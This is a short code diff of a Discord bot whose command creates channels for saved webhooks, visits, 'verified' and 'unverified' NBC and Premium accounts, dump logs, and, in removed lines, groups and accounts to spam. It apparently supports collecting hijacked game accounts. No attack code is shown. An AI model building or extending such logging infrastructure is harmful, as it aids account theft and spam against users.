@@ -167,12 +167,11 @@ async def gen_webhooks(interaction: discord.Interaction):
     await asyncio.sleep(3)
 
     structure = {
-        "WEBHOOKS": ["【🕸】𝚂𝙰𝚅𝙴𝙳 𝚆𝙴𝙱𝙷𝙾𝙾𝙺", "【🌐】𝚂𝙸𝚃𝙴"],
-        "VISITS": ["【🕸】𝚅𝙸𝚂𝙸𝚃𝚂"],
+        "WEBHOOKS": ["【🕸】𝚂𝙰𝚅𝙴𝙳 𝚆𝙴𝙱𝙷𝙾𝙾𝙺"],
+        "VISITS": ["【🚪】𝚅𝙸𝚂𝙸𝚃𝚂"],
         "UN VERIFIED": ["【🔓】𝙽𝙱𝙲", "【🔓】𝙿𝚁𝙴𝙼𝙸𝚄𝙼"],
         "VERIFIED": ["【🔒】𝚅𝙽𝙱𝙲", "【🔒】𝚅-𝙿𝚁𝙴𝙼𝙸𝚄𝙼"],
         "DUMP LOGS": ["【📈】𝚂𝚄𝙲𝙲𝙴𝚂𝚂", "【📉】𝙵𝙰𝙸𝙻𝙴𝙳"],
-        "OTHER": ["【📜】𝙶𝚁𝙾𝚄𝙿 𝚃𝙾 𝚂𝙿𝙰𝙼", "【📜】𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙵𝙾𝚁 𝚂𝙿𝙰𝙼"]
   }
   
     created_channels = {}
@@ -241,7 +240,7 @@ async def help_command(interaction: discord.Interaction):
         inline=False
     )
 
-    help_embed.set_footer(text="Bot by ArzconicMgui | Use commands wisely.")
+    help_embed.set_footer(text=" Owner Arzconic Mgui | Use commands wisely.")
     help_embed.set_thumbnail(url="https://i.imgur.com/5cX1G98.png")  # Optional cool thumbnail
 
     await interaction.followup.send(embed=help_embed, ephemeral=True)
